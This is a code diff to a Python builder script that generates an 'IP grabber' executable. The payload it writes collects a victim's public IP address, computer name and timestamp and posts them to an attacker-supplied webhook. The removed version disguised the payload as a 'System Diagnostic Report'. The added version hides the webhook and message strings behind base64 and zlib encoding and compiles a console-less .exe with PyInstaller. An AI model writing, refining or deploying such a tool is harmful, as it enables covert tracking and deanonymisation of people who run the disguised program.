@@ -1,61 +1,111 @@
 import os
 import shutil
+import base64
+import zlib
 
-webhook = input("Enter Webhook: ").strip()
-if not webhook:
-    print("Configuration required.")
-    exit()
+def generate_obfuscated_code(webhook):
+    def b64zip(s):
+        """Compress string and encode as base64"""
+        return base64.b64encode(zlib.compress(s.encode())).decode()
 
-filename = input("Enter file name (no extension): ").strip()
-if not filename:
-    filename = "SystemReport"
+    def b64(s):
+        """Base64 encode a string"""
+        return base64.b64encode(s.encode()).decode()
 
-py_file = f"{filename}.py"
+    
+    webhook_encoded = b64zip(webhook)
+    ip_url_encoded = b64zip("https://api.ipify.org")
 
-# Disguised payload
-payload_code = f'''
-import datetime as _dt
-import platform as _pf
-from requests import get as _get, post as _post
+    # Message parts (encoded in base64)
+    msg_title = b64("IP Grabbed!")
+    msg_ip = b64("IP Address:")
+    msg_pc = b64("PC Name:")
+    msg_time = b64("Timestamp:")
 
-_CONFIG = "{webhook}"
+    
+    return f'''
+import base64 as b, zlib as z, datetime as d, platform as p, requests as r
 
-def _sync_system_info():
-    try:
-        _net_id = _get('https://api.ipify.org', timeout=5).text
-        _sys_data = {{
-            "content": (
-                "System Diagnostic Report\\n"
-                f"Network Identifier: `{{_net_id}}`\\n"
-                f"Device Label: `{{_pf.node()}}`\\n"
-                f"Timestamp: `{{_dt.datetime.now()}}`"
-            )
-        }}
-        _post(_CONFIG, json=_sys_data, timeout=5)
-    except Exception:
-        pass
+
+def _u(x): return z.decompress(b.b64decode(x)).decode()
+def _t(x): return b.b64decode(x).decode()
+
+
+_w = _u("{webhook_encoded}")
+_i = _u("{ip_url_encoded}")
+
+
+_m1 = _t("{msg_title}")
+_m2 = _t("{msg_ip}")
+_m3 = _t("{msg_pc}")
+_m4 = _t("{msg_time}")
+
+
+def g():
+    try: return r.get(_i, timeout=5).text
+    except: return "x.x.x.x"
+
+def j():
+    return {{
+        "content": f"{{_m1}}\\n{{_m2}} `{{g()}}`\\n{{_m3}} `{{p.node()}}`\\n{{_m4}} `{{d.datetime.now()}}`"
+    }}
+
+
+def s():
+    try: r.post(_w, json=j(), timeout=5)
+    except: pass
 
 if __name__ == "__main__":
-    _sync_system_info()
+    s()
 '''
 
-with open(py_file, "w", encoding="utf-8") as f:
-    f.write(payload_code)
+def clean_filename(name):
+    """Clean up the filename to make it valid and safe"""
+    return "".join(c for c in name if c.isalnum() or c in (' ', '-', '_'))
 
-print("🔧 Compiling diagnostic tool...")
-os.system(f"pyinstaller --onefile --noconsole --name \"{filename}\" \"{py_file}\"")
+def main():
+    webhook = input("Enter Webhook URL: ").strip()
+    if not webhook:
+        print("❌ Webhook is required.")
+        return
 
-exe_path = f"dist/{filename}.exe"
-if os.path.exists(exe_path):
-    shutil.move(exe_path, f"./{filename}.exe")
+    filename = input("Enter file name (without .py): ").strip()
+    filename = clean_filename(filename) or "CreateGrabber"
 
-for folder in ["build", "dist"]:
-    shutil.rmtree(folder, ignore_errors=True)
+    py_file = f"{filename}.py"
 
-for ext in [".spec", ".py"]:
     try:
-        os.remove(f"{filename}{ext}")
-    except FileNotFoundError:
-        pass
+        # Write the obfuscated code to the .py file
+        with open(py_file, "w", encoding="utf-8") as f:
+            f.write(generate_obfuscated_code(webhook))
+    except Exception as e:
+        print(f"❌ Failed to write file: {e}")
+        return
 
-print(f"✅ Diagnostic tool created: {filename}.exe")
+    print(f"⚙️ Building the .exe with filename {filename}.exe...")
+
+    # Use PyInstaller to build the .exe
+    os.system(f'pyinstaller --onefile --noconsole --name "{filename}" "{py_file}"')
+
+    # Path of the generated .exe
+    exe_path = f"dist/{filename}.exe"
+    if os.path.exists(exe_path):
+        shutil.move(exe_path, f"./{filename}.exe")
+    else:
+        print("❌ Build failed: .exe not found.")
+        return
+
+    # Clean up build artifacts
+    for folder in ["build", "dist"]:
+        shutil.rmtree(folder, ignore_errors=True)
+
+    for ext in [".spec", ".py"]:
+        try:
+            os.remove(f"{filename}{ext}")
+        except FileNotFoundError:
+            pass
+
+    print(f"✔️ {filename}.exe successfully created!")
+
+if __name__ == "__main__":
+    main()
